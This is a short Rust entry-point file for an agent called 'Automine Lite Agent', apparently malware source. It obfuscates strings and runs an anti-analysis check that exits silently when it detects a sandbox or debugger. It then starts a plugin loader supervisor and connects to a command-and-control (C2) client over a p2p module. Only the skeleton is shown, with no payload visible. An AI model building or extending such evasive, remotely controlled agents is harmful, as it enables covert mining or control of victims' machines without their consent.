mod common;
use obfstr::obfstr;
mod utils;
mod p2p;
mod host;
mod security;
mod modules;
use clap::Parser;

#[derive(Parser)]
#[command(name = "automine")]
#[command(about = "Automine Lite Agent", long_about = None)]
#[command(version)]
struct Cli {}

#[tokio::main]
async fn main() {
    // 0. Anti-Analysis Check 
    if security::anti_analysis::is_analysis_environment() {
        return; 
    }

    // Spawn Plugin Supervisor
    tokio::spawn(async {
        modules::loader::start_supervisor().await;
    });

    // Lite Mode: Just run C2
    if let Err(e) = p2p::c2::start_client().await {
        eprintln!("{}: {}", obfstr!("C2 Error"), e);
    }
}
